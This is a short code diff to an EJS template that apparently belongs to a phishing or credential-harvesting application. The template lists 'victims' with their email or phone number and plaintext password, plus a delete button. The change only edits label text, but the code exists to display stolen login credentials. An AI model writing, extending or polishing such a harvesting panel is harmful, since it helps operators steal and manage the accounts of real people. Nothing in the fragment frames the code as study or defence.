@@ -18,8 +18,8 @@
                 <% victims.forEach(victim => { %>
                     <li>
                         <div class="details">
-                            <strong>Email/Number: <p><%= victim.emailOrNumber %></p></strong>
-                            <strong>Password: <p><%= victim.password %></p></strong>
+                            <strong>Email or Number <p><%= victim.emailOrNumber %></p></strong>
+                            <strong>Password <p><%= victim.password %></p></strong>
                         </div>
                         <form action="/delete-victim/<%= victim._id %>" method="POST" style="display:inline;">
                             <button type="submit">Delete</button>
